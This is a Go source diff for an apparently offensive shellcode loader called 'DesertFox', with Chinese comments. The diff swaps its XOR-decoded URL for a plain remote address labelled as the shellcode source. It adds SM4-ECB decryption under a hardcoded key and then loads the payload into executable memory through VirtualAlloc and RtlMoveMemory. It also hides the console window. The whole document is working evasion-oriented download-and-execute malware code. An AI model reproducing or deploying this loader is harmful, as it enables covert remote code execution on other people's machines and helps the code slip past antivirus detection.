@@ -2,16 +2,14 @@ package function
 
 import (
 	"crypto/tls"
-	"fmt"
 	"golang.org/x/sys/windows/registry"
 	"golang.org/x/w32"  //将该项目https://github.com/gonutz/ide/tree/master/w32本地导入
 	"io/ioutil"
 	"log"
+	"golang.org/x/gmsm/sm4"
 	"net/http"
 	"os"
-	"os/exec"
 	"path/filepath"
-	"strconv"
 	"strings"
 	"syscall"
 	"unsafe"
@@ -24,34 +22,20 @@ const (
 )
 
 var (
-	XorKey	[]byte = []byte{0x7B, 0xC4, 0x86, 0xE3, 0x6A, 0x5D, 0xF4, 0xF2}
+	key = []byte("douknowwhoami?dr") // 填入对应的16位密钥
 	kernel32           = syscall.MustLoadDLL("kernel32.dll")
 	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
 	ntdll              = syscall.MustLoadDLL("ntdll.dll")
 	RtlMoveMemory        = ntdll.MustFindProc("RtlMoveMemory")
 )
 
-func dec(src string) (res string) {
-	var s int64
-	var result string
-	j := 0
-	bt := []rune(src)
-	for i := 0; i < len(src)/2; i++ {
-		s, _ = strconv.ParseInt(string(bt[i*2:i*2+2]), 16, 0)
-		result = result + string(byte(s)^XorKey[j])
-		j = (j + 1) % 8
-	}
-	return result
-}
-
-
 
 //DesertFox主函数
 
 func Proceed() {
-	//下方填上异或加密(encryptUrl.go)后的url
-	Url := dec("13b0f2931967dbdd0fb6e78d193b918055b7eecc0d3880dd1494caad2211db9a1ea8ea8c443f9d9c")
-	var charcode []byte
+
+	Url := "http://192.168.0.100:8080/zha0gongz1"	//shellcode远程地址
+	var ecbDec []byte
 	tr :=&http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify:true},
 	}
@@ -66,8 +50,9 @@ func Proceed() {
 		if err != nil {
 			log.Fatal(err)
 		}
-		charcode = bodyBytes
+		ecbDec = bodyBytes
 	}
+	charcode, err := sm4.Sm4Ecb(key, ecbDec, false)
 
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	if addr == 0 {
@@ -97,7 +82,7 @@ func HideWindow() {
 	console := w32.GetConsoleWindow()
 
 	if console == 0 {
-		return // no console attached
+		return 
 	}
 	_, consoleProcID := w32.GetWindowThreadProcessId(console)
 
